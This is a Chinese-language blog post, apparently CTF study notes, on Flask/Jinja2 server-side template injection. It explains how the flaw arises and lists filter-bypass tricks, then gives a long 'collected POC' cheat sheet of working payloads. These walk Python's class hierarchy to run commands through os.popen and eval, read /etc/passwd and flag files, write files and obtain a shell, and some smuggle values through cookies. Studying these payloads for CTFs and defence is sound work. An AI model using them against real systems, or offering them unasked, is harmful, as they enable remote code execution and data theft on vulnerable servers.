# SSTI-Flask模板注入


# Flask之SSTI模版注入

参考博客：[flask之ssti模版注入从零到入门]([flask之ssti模版注入从零到入门 - 先知社区](https://xz.aliyun.com/t/3679?time__1311=n4%2Bxnii%3DoGqmqDK0QDODlx6e0%3DWyK0KA%3DoK4iK%3Dx))

## SSTI漏洞框架

- Python
  - Jinja2
  - mako
  - tornado
  - django
- PHP
  - smarty
  - twig
- Java
  - jade
  - velocity

## SSTI漏洞成因

**使用了渲染函数时**，由于代码**不规范或信任了用户输入**而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

## 模板引擎

模板引擎可以让（网站）程序实现**界面与数据分离**，**业务代码与逻辑代码的分离**，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。

虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。

模板是用于从数据（变量）到实际的视觉表现（HTML代码）

实际：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。

渲染主要分为：前端渲染和后端渲染。

- 后端渲染

  服务器计算，给用户呈现HEML字符串。前端只需要显示

- 前端渲染

  浏览器从后端服务器得到信息，语言可能是json等数据包封装，也可能是html代码。但是需要浏览器前端来解析渲染成html代码呈现。

## 服务模板注入

模板就是通过输入转换成特定的HTML文件，如一些博客页面，登录时候返回`hi,xxx`。

而这个`xxx`就是通过身份信息渲染成的html返回页面。

例如：

```
$output = $twig-&gt;render( $_GET[&#39;custom_email&#39;] , array(&#34;first_name&#34; =&gt; $user.first_name) );
```

本身就有xss漏洞，如果用`custom_emai`直接写`&lt;img&gt;alert(&#34;xss&#34;)&lt;/img&gt;`

但是由于本身的不规范，还有这更严重的ssti漏洞

如果`url:xxxx/?custom_emai={{7*7}}`，会返回49的计算值

在`{{}}`里，他将我们的代码进行了执行。服务器将我们的数据经过引擎解析的时候，进行了执行，模板注入与sql注入成因有点相似，都是信任了用户的输入，将不可靠的用户输入不经过滤直接进行了执行，用户插入了恶意代码同样也会执行。

### flask 框架的实例代码

```
from flask import Flask

app = Flask(__name__)

@app.route(&#39;/&#39;)
def hello_world():
    return &#34;Hello World&#34;

if __name__ == &#39;__main__&#39;:
    app.run()
```

### route装饰器路由

```
@app.route(&#39;/&#39;)
```

选择url的定位

`/` 表示网页根目录

`/test`就需要用127.0.0.1:5000/test进入

如果设置动态网址可以写为

```
@app.route(&#34;/hello/&lt;username&gt;&#34;)
def hello_user(username):
  return &#34;user:%s&#34;%username
```

### main入口

```
app.debug = True
app.run(debug=True)
```

加上debug就可以直接改代码后直接刷新进行显示保存的修改代码，不用重运行

## 模板渲染！！！

###   模板渲染体系

`render_template`函数渲染的是`templates`中的模板

```
├── app.py  
├── static  
│   └── style.css  
└── templates  
    └── index.html
```

例如index.html里面有

```
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
  &lt;/head&gt;
 &lt;body&gt;
      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

其中`title`和`user.name`

### flask-SSTI

关键代码：用于渲染

```
render_template()
```

&gt; 以下是无过滤情况的过程

查找类

```
&#34;&#34;.__class__	# str
```


查找基类

```
&#34;&#34;.__class__.__bases__	# object
&#34;&#34;.__class__.__mro__
```

查这个类的子类的集合

```
&#34;&#34;.__class__.__bases__[0].__subclasses__()	
# [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class...
```

找到合适的类，然后从合适的类中寻找我们需要的方法

`&lt;class &#39;os._wrap_close&#39;&gt;`，os命令相信你看到就感觉很亲切

## 绕过tips

### 过滤[]等括号

使用gititem绕过

```
{{&#34;&#34;.**class**.**bases**[0]}}	# 原
{{&#34;&#34;.class.bases.getitem(0)}}	# 后
```

### 过滤subclasses

拼凑法

```
{{&#34;&#34;.class.bases[0].subclasses()}}	# 原
{{&#34;&#34;.class.bases[0]&#39;subcla&#39;&#43;&#39;sses&#39;}}	# 后
```

### 过滤class

使用session

```
{{session[&#39;cla&#39;&#43;&#39;ss&#39;].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}	# 原

```

多个bases[0]是因为一直在向上找object类。使用mro就会很方便

```
{{session[&#39;__cla&#39;&#43;&#39;ss__&#39;].__mro__[12]}}
request[&#39;__cl&#39;&#43;&#39;ass__&#39;].__mro__[12]}}
```

### timeit姿势

&gt; 例题：2017 swpu-ctf

```
import timeit
timeit.timeit(&#34;__import__(&#39;os&#39;).system(&#39;dir&#39;)&#34;,number=1)

import platform
print platform.popen(&#39;dir&#39;).read()
```

## 收藏版poc

```
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls  /var/www/html&#34;).read()&#39; )
```

```
object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;&#43;&#39;s&#39;].__dict__[&#39;sy&#39;&#43;&#39;stem&#39;](&#39;ls&#39;)
```

```
{{request[&#39;__cl&#39;&#43;&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;&#43;&#39;sses__&#39;]()[60][&#39;__in&#39;&#43;&#39;it__&#39;][&#39;__&#39;&#43;&#39;glo&#39;&#43;&#39;bal&#39;&#43;&#39;s__&#39;][&#39;__bu&#39;&#43;&#39;iltins__&#39;][&#39;ev&#39;&#43;&#39;al&#39;](&#39;__im&#39;&#43;&#39;port__(&#34;os&#34;).po&#39;&#43;&#39;pen(&#34;ca&#34;&#43;&#34;t a.php&#34;).re&#39;&#43;&#39;ad()&#39;)}}
```

```
# 读文件
#读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40](&#39;flag&#39;).read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()}}
{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()}}
{{[].__class__.__base__.__subclasses__()[257](&#39;flag&#39;).read()}} (python3)


#直接使用popen命令，python2是非法的，只限于python3
os._wrap_close 类里有popen
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()}}


#调用os的popen执行命令
#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /flag&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
#python3专属
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}


#调用eval函数读取
#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}} 
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&#34;ls&#34;)&#39;)}}
#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}} 
{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]}}
{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}


#调用 importlib类
{{&#39;&#39;.__class__.__base__.__subclasses__()[128][&#34;load_module&#34;](&#34;os&#34;)[&#34;popen&#34;](&#34;ls /&#34;).read()}}


#调用linecache函数
{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}


#调用communicate()函数
{{&#39;&#39;.__class__.__base__.__subclasses__()[128](&#39;whoami&#39;,shell=True,stdout=-1).communicate()[0].strip()}}


#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{&#34;&#34;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)}}  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__
{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).write(&#39;123456&#39;)}}


#通用 getshell
原理就是找到含有 __builtins__ 的类，然后利用。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;) }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}

```

```
# request.cookie
{{self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&#34;/flag&#34;).read()}}

{{self[request.cookies.di][request.cookies.temp][request.cookies.lip][request.cookies.glo][request.cookies.bui].open(request.cookies.cmd).read()}}
 
cookie:di=__dict__;temp=_TemplateReference__context;lip=lipsum;glo=__globals__;bui=__builtins__;cmd=flag
```



## 漏洞挖掘



---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-ssti-flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/  

